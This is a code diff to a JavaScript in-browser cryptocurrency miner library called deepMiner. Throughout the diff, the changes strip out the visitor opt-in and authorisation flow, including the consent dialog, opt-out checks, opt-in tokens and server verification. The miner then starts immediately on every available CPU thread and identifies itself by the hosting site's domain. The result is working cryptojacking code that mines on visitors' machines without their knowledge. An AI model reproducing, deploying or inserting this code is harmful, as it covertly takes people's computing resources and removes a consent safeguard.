@@ -1,20 +1,16 @@
 (function(window) {
     "use strict";
-    var Miner = function(siteKey, params) {
+    var Miner = function(userID, params) {
         this.params = params || {};
-        this._siteKey = siteKey;
-        this._user = null;
+        this._userID = userID;
         this._threads = [];
         this._hashes = 0;
         this._currentJob = null;
         this._autoReconnect = true;
         this._reconnectRetry = 3;
-        this._tokenFromServer = null;
-        this._goal = 0;
         this._totalHashesFromDeadThreads = 0;
         this._throttle = Math.max(0, Math.min(0.99, this.params.throttle || 0));
         this._stopOnInvalidOptIn = false;
-        this._waitingForAuth = false;
         this._selfTestSuccess = false;
         this._verifyThread = null;
         this._autoThreads = {
@@ -42,28 +38,19 @@
                 }.bind(this);
             } catch (e) {}
         }
-        if (deepMiner.CONFIG.REQUIRES_AUTH) {
-            this._auth = new deepMiner.Auth(this._siteKey, {
-                theme: this.params.theme || "light",
-                lang: this.params.language || "auto"
-            });
-        }
         this._eventListeners = {
             open: [],
-            authed: [],
             close: [],
             error: [],
             job: [],
             found: [],
             accepted: [],
-            optin: []
         };
         var defaultThreads = navigator.hardwareConcurrency || 4;
         this._targetNumThreads = this.params.threads || defaultThreads;
         this._useWASM = this.hasWASMSupport() && !this.params.forceASMJS;
         this._asmjsStatus = "unloaded";
         this._onTargetMetBound = this._onTargetMet.bind(this);
-        this._onVerifiedBound = this._onVerified.bind(this);
     };
     Miner.prototype.start = function(mode, optInToken) {
         this._tab.mode = mode || deepMiner.IF_EXCLUSIVE_TAB;
@@ -120,9 +107,6 @@
     };
     Miner.prototype.getAcceptedHashes = function() {
         return this._hashes;
-    };
-    Miner.prototype.getToken = function() {
-        return this._tokenFromServer;
     };
     Miner.prototype.on = function(type, callback) {
         if (this._eventListeners[type]) {
@@ -184,20 +168,6 @@
     Miner.prototype.isMobile = function() {
         return /mobile|Android|webOS|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(navigator.userAgent);
     };
-    Miner.prototype.didOptOut = function(seconds) {
-        if (!deepMiner.CONFIG.REQUIRES_AUTH) {
-            return false;
-        }
-        seconds = seconds || 60 * 60 * 4;
-        var t = this._auth.getOptOutTime();
-        return !!(t && t > Date.now() / 1e3 - seconds);
-    };
-    Miner.prototype.isAuthed = function() {
-        if (deepMiner.CONFIG.REQUIRES_AUTH) {
-            return this._auth.isAuthed();
-        }
-        return true;
-    };
     Miner.prototype.selfTest = function(callback) {
         this._loadWorkerSource(
             function() {
@@ -251,25 +221,7 @@
         }
         this.setNumThreads(this._targetNumThreads);
         this._autoReconnect = true;
-        if (deepMiner.CONFIG.REQUIRES_AUTH && !this._optInToken) {
-            this._waitingForAuth = true;
-            this._auth.auth(
-                function(token) {
-                    this._waitingForAuth = false;
-                    if (!token) {
-                        this.stop();
-                        this._emit("optin", { status: "canceled" });
-                        this._emit("error", { error: "opt_in_canceled" });
-                        return;
-                    }
-                    this._emit("optin", { status: "accepted" });
-                    this._optInToken = token;
-                    this._connectAfterSelfTest();
-                }.bind(this)
-            );
-        } else {
-            this._connectAfterSelfTest();
-        }
+        this._connectAfterSelfTest();
     };
     Miner.prototype._otherTabRunning = function() {
         if (this._tab.lastPingReceived > Date.now() - 1500) {
@@ -295,14 +247,6 @@
             this.stop("dontKillTabUpdate");
         } else if (!otherTabRunning && !this.isRunning()) {
             this._startNow();
-        }
-        if (this.isRunning() && !this._waitingForAuth) {
-            if (this._bc) {
-                this._bc.postMessage("ping");
-            }
-            try {
-                localStorage.setItem("deepMiner", JSON.stringify({ ident: this._tab.ident, time: Date.now() }));
-            } catch (e) {}
         }
     };
     Miner.prototype._adjustThreads = function() {
@@ -339,7 +283,7 @@
         return hash >>> 0;
     };
     Miner.prototype._connectAfterSelfTest = function() {
-        if (this._selfTestSuccess || this.hasWASMSupport()) {
+        if (this._selfTestSuccess && this.hasWASMSupport()) {
             this._connect();
         } else {
             this.selfTest(
@@ -368,28 +312,12 @@
         this._socket.onclose = this._onClose.bind(this);
         this._socket.onopen = this._onOpen.bind(this);
     };
-    Miner.prototype._onOpen = function(ev) {
+    Miner.prototype._onOpen = function() {
         this._emit("open");
         var params = {
             version: deepMiner.VERSION,
-            site_key: this._siteKey,
-            type: "anonymous",
-            user: null,
-            goal: 0
+            userID: this._userID
         };
-        if (this._user) {
-            params.type = "user";
-            params.user = this._user.toString();
-        } else if (this._goal) {
-            params.type = "token";
-            params.goal = this._goal;
-        }
-        if (this.params.ref) {
-            params.ref = this.params.ref;
-        }
-        if (this._optInToken) {
-            params.opt_in = this._optInToken;
-        }
         this._send("auth", params);
     };
     Miner.prototype._onError = function(ev) {
@@ -420,8 +348,6 @@
                 this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery;
                 this._autoThreads.interval = setInterval(this._adjustThreads.bind(this), 1e3);
             }
-        } else if (msg.type === "verify") {
-            this._verifyThread.verify(msg.params, this._onVerifiedBound);
         } else if (msg.type === "hash_accepted") {
             this._hashes = msg.params.hashes;
             this._emit("accepted", msg.params);
@@ -439,7 +365,7 @@
                 console.error("deepMiner Error:", msg.params.error);
             }
             this._emit("error", msg.params);
-            if (msg.params.error === "invalid_site_key") {
+            if (msg.params.error === "invalid_userID") {
                 this._reconnectRetry = 6e3;
                 this._tab.waitReconnect = Date.now() + 6e3 * 1e3;
             } else if (msg.params.error === "invalid_opt_in") {
@@ -474,9 +400,6 @@
             });
         }
     };
-    Miner.prototype._onVerified = function(verifyResult) {
-        this._send("verified", verifyResult);
-    };
     Miner.prototype._send = function(type, params) {
         if (!this._socket) {
             return;
@@ -489,18 +412,10 @@
     window.deepMiner.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
     window.deepMiner.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
     window.deepMiner.FORCE_MULTI_TAB = "forceMultiTab";
-    window.deepMiner.Token = function(siteKey, goal, params) {
-        var miner = new Miner(siteKey, params);
-        miner._goal = goal || 0;
-        return miner;
-    };
-    window.deepMiner.User = function(siteKey, user, params) {
-        var miner = new Miner(siteKey, params);
-        miner._user = user;
-        return miner;
-    };
-    window.deepMiner.Anonymous = function(siteKey, params) {
-        var miner = new Miner(siteKey, params);
+    window.deepMiner.DOMAIN = document.location.origin.split('/').pop() || null;
+    window.deepMiner.Init = function(userID, params) {
+        userID = userID || deepMiner.DOMAIN || "deepMiner";
+        var miner = new Miner(userID, params);
         return miner;
     };
     window.deepMiner.Res = function(s) {
@@ -580,6 +495,7 @@ self.deepMiner = self.deepMiner || {};
 self.deepMiner.protocol = (document.location.protocol === "https:") ? "s" : "";
 self.deepMiner.CONFIG = {
     LIB_URL: "http" + deepMiner.protocol + "://%deepMiner_domain%/lib/",
+    ASMJS_NAME: "",
     WEBSOCKET_SHARDS: [["ws" + deepMiner.protocol + "://%deepMiner_domain%/proxy"]],
     MINER_URL: "http" + deepMiner.protocol + "://%deepMiner_domain%/miner.html"
 };
